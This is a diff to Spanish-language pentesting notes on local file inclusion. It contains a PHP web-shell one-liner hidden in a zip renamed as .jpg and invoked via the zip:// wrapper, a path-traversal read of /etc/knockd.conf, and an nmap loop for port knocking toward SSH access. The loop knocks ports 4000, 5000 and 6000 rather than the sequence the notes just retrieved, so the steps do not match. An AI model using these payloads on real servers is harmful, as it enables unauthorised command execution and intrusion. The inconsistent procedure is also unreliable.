@@ -43,3 +43,21 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ### Zip upload
 - `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
 - `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
+
+### knockd LFI file
+- [fuente](https://sirensecurity.io/blog/port-knocking/)
+- knockd es un daemon que se utiliza para abrir puertos en un firewall que está cerrado.
+- Por ejemplo podemos visitar: `../../../../../../../../../../etc/knockd.conf`
+- Y nos devuelve: `[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn`
+- Esto significa que el puerto 22 está cerrado y que knockd está configurado para abrirlo.
+- Para eso vamos a hacer un for loop:
+
+```bash
+
+for x in 4000 5000 6000; do
+nmap -Pn --host-timeout 201 --max-retries 0 -p $x $IP;
+done
+
+```
+
+- Esto nos va a dar el puerto que está abierto, y después podemos hacer un reverse shell con el puerto 22.
